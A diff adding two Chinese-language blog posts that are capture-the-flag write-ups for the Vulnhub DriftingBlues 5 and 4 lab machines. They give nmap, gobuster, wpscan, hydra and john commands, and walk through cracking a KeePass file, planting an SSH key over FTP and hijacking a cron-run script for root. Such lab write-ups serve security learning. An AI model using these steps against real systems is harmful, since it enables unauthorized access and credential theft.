@@ -82,6 +82,192 @@
 
     
         <h2 class="title">
+            <a href="/2022/06/06/Driftingblues-5/">
+                Driftingblues 5
+            </a>
+        </h2>
+    
+    <time>
+        Jun 6, 2022
+    </time>
+    <section class="content">
+        <h1><span id="driftingblues5">Driftingblues:5</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称driftingblues5">名称：DriftingBlues:5</span></h4><h4><span id="发布日期202138">发布日期：2021.3.8</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列driftingblues">系列：DriftingBlues</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>gill:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt</p>
+<h4><span id="难度困难">难度：困难</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名driftingblues5_vhova">文件名：driftingblues5_vh.ova</span></h4><h4><span id="文件大小715mb">文件大小：715MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagedriftingbluesdriftingblues5_vhova">下载地址：</span></h4><h4><span id="md5-21e0290277c1523b3e9def173ea0fa66">MD5: 21E0290277C1523B3E9DEF173EA0FA66</span></h4><h4><span id="sha1-371c270f8d2c8f65436f9bd52485e2128fc6365b">SHA1: 371C270F8D2C8F65436F9BD52485E2128FC6365B</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机driftingblues5和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/06/06/Driftingblues-5/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-5/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-5/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了22和80端口，访问主页查看源码，确定是wordpress搭建的页面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.117 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-5/4.png" alt="image-"></p>
+<p><img src="/2022/06/06/Driftingblues-5/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，都是wordpress相关的目录内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.117/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-5/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="wordpress用户密码爆破">Wordpress用户密码爆破</span></h3><blockquote>
+<p>1.扫描得到的结果都指向wordpress，则用wpscan进行扫描，可以得到5个用户及其密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.56.117 --detection-mode aggressive -e --passwords=/home/kali/Desktop/rockyou.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-5/7.png" alt="image-"></p>
+<p>2.但是如果使用rockyou.txt作为密码字典要跑出对应密码相当消耗时间，合理可以用cewl生成一个较小的字典，能够得到gill用户的密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl -m 6 -w drift.txt http://192.168.56.117</span><br><span class="line">wpscan --url http://192.168.56.117 --detection-mode aggressive -e u -P drift.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-5/8.png" alt="image-"></p>
+<p>3.进入wordpress管理后台，利用gill登录，但gill用户的权限不够，无法从wordpress后台写入webshell：</p>
+<p><img src="/2022/06/06/Driftingblues-5/9.png" alt="image-"></p>
+</blockquote>
+<h3><span id="ssh登录初步提权">SSH登录，初步提权</span></h3><blockquote>
+<p>1.回到主页，结合目录扫描的结果，我们能在<a target="_blank" rel="noopener" href="http://192.168.56.117/wp-content/uploads/2021/02/%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%8F%91%E7%8E%B0%E4%B8%BB%E9%A1%B5%E8%B0%83%E7%94%A8%E7%9A%84%E5%9B%BE%E7%89%87%EF%BC%8C%E5%85%B6%E4%B8%ADdblogo.png%E6%98%AF%E5%94%AF%E4%B8%80%E6%B2%A1%E8%A2%AB%E4%BD%BF%E7%94%A8%E5%88%B0%E7%9A%84%E5%9B%BE%E7%89%87%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E7%94%A8exiftool%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%8B%EF%BC%9A">http://192.168.56.117/wp-content/uploads/2021/02/目录下发现主页调用的图片，其中dblogo.png是唯一没被使用到的图片，我们可以用exiftool查看一下：</a></p>
+<p><img src="/2022/06/06/Driftingblues-5/10.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool /home/kali/Downloads/dblogo.png</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-5/11.png" alt="image-"></p>
+<p>2.得到了ssh的密码，我们尝试登录一下，发现其实就是全小写，并且找到第一个flag，user.txt：</p>
+<p><img src="/2022/06/06/Driftingblues-5/12.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.可以发现文件夹有keyfile.kdbx这个密码库文件，把这个文件获取到kali，用keepass2john解一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，gill开启http服务</span><br><span class="line">wget http://192.168.56.117:8001/keyfile.kdbx，kali获取密码库文件</span><br><span class="line">keepass2john keyfile.kdbx | tee hash</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-5/13.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">John hash –wordlist=rockyou.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-5/14.png" alt="image-"></p>
+<p>2.得到的porsiempre并不是root的密码，我们再把keyfile.kdbx放在<a target="_blank" rel="noopener" href="https://app.keeweb.info/%E6%89%93%E5%BC%80%EF%BC%8C%E5%BE%97%E5%88%B0%E7%9A%846%E4%B8%AA%E5%AF%86%E7%A0%81%E4%B9%9F%E4%B8%8D%E6%98%AFroot%E5%AF%86%E7%A0%81%EF%BC%9A">https://app.keeweb.info/打开，得到的6个密码也不是root密码：</a></p>
+<p><img src="/2022/06/06/Driftingblues-5/15.png" alt="image-"></p>
+<p>3.回到gill用户下，查看具有sudo权限的应用，没有发现明显可用的应用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -type f -exec ls -la &#123;&#125; 2&gt;/dev/null \;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-5/16.png" alt="image-"></p>
+<p>4.利用linpeas.sh进行扫描，发现root下有&#x2F;keyfolder这个目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开放http服务</span><br><span class="line">wget http://192.168.56.102:8001/linpeas.sh，gill获取linpeas工具</span><br><span class="line">chmod +x linpeas.sh</span><br><span class="line">./linpeas.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-5/17.png" alt="image-"></p>
+<p>5.我们查看&#x2F;keyfolder这个目录，发现有其他用户可以在这个目录下写入：</p>
+<p><img src="/2022/06/06/Driftingblues-5/18.png" alt="image-"></p>
+<p>6.再利用pspy64s监视进程，发现&#x2F;root&#x2F;key.sh这个进程是定时执行的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.102:8001/pspy64s，gill获取pspy64s</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-5/19.png" alt="image-"></p>
+<p>7.那么我们可以边让pspy64s进行监听，进入&#x2F;keyfolder目录，将之前keyfile.kdbx内的密码一个个尝试，等待pspy64s监听到key.sh的一次执行，没有获得文件，就删去尝试的密码文件：</p>
+<p><img src="/2022/06/06/Driftingblues-5/20.png" alt="image-"></p>
+<p>8.rootcreds.txt的内容就是root用户的密码，提权后在&#x2F;root目录下能够找到第二个flag，即root.txt：</p>
+<p><img src="/2022/06/06/Driftingblues-5/21.png" alt="image-"></p>
+<p><img src="/2022/06/06/Driftingblues-5/22.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Driftingblues/" rel="tag">Driftingblues</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/06/06/Driftingblues-4/">
+                Driftingblues 4
+            </a>
+        </h2>
+    
+    <time>
+        Jun 6, 2022
+    </time>
+    <section class="content">
+        <h1><span id="driftingblues4">Driftingblues:4</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称driftingblues4">名称：DriftingBlues:4</span></h4><h4><span id="发布日期202138">发布日期：2021.3.8</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列driftingblues">系列：DriftingBlues</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>hubert:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt</p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名driftingblues4_vhova">文件名：driftingblues4_vh.ova</span></h4><h4><span id="文件大小603mb">文件大小：603MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagedriftingbluesdriftingblues4_vhova">下载地址：</span></h4><h4><span id="md5-eeea3e2332e41ce013245f18c4d4d226">MD5: EEEA3E2332E41CE013245F18C4D4D226</span></h4><h4><span id="sha1-ed30008e15b83f641b1078dd84cbd747ac2141ff">SHA1: ED30008E15B83F641B1078DD84CBD747AC2141FF</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机driftingblues4和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/06/06/Driftingblues-4/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-4/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-4/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现开放了21，22和80端口，访问主页查看源码，有一串base64编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.116 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-4/4.png" alt="image-"></p>
+<p><img src="/2022/06/06/Driftingblues-4/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，没有什么太多发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.116/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-4/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="信息解密">信息解密</span></h3><blockquote>
+<p>1.对得到的base64编码字串进行四次解码，得到路径&#x2F;imfuckingmad.txt：</p>
+<p><img src="/2022/06/06/Driftingblues-4/7.png" alt="image-"></p>
+<p>2.访问后得到一串brainfuck编码，进行解码得到&#x2F;iTiS3Cr3TbiTCh.png：</p>
+<p><img src="/2022/06/06/Driftingblues-4/8.png" alt="image-"></p>
+<p><img src="/2022/06/06/Driftingblues-4/9.png" alt="image-"></p>
+<p>3.访问图片路径，是一张二维码，扫描二维码跳转到一张图片，图片内有几个用户名：</p>
+<p><img src="/2022/06/06/Driftingblues-4/10.png" alt="image-"></p>
+<p><img src="/2022/06/06/Driftingblues-4/11.png" alt="image-"></p>
+</blockquote>
+<h3><span id="ftp爆破初步提权">FTP爆破，初步提权</span></h3><blockquote>
+<p>1.根据之前base64解码的提示，开始用得到的用户名进行ftp爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l luther -P rockyou.txt ftp://192.168.56.116</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-4/12.png" alt="image-"></p>
+<p>2.登录成功后发现的确还有hubert这个用户，发现该用户下没有.ssh目录，则可以创建.ssh目录，然后把kali的公钥上传，进行ssh免密登录：</p>
+<p><img src="/2022/06/06/Driftingblues-4/13.png" alt="image-"></p>
+<p><img src="/2022/06/06/Driftingblues-4/14.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd hubert</span><br><span class="line">mkdir .ssh</span><br><span class="line">put authorized_keys</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-4/15.png" alt="image-"></p>
+<p>3.登录hubert后，我们可以在目录下找到第一个flag，user.txt：</p>
+<p><img src="/2022/06/06/Driftingblues-4/16.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.可以发现文件夹下还有一个python文件，查看一下，程序是将1写入&#x2F;tmp&#x2F;backdoor_testing：</p>
+<p><img src="/2022/06/06/Driftingblues-4/17.png" alt="image-"></p>
+<p>2.我们利用pspy64s工具进行进程检测，发现emergency.py是被定时执行的，那么我们将原有的emergency.py删除，新建一个用于提权的同名文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开启http服务</span><br><span class="line">wget http://192.168.56.102:8001/pspy64s，hubert获取pspy64s工具</span><br><span class="line">chmod +x pspy64s</span><br><span class="line">./pspy64s</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-4/18.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -f emergency.py</span><br><span class="line">vi emergency.py</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-4/19.png" alt="image-"></p>
+<p>3.在kali开启对应的端口监听，过一会就能收到root权限，在&#x2F;root目录下能够找到第二个flag，root.txt：</p>
+<p><img src="/2022/06/06/Driftingblues-4/20.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Driftingblues/" rel="tag">Driftingblues</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2022/06/06/Driftingblues-3/">
                 Driftingblues 3
             </a>
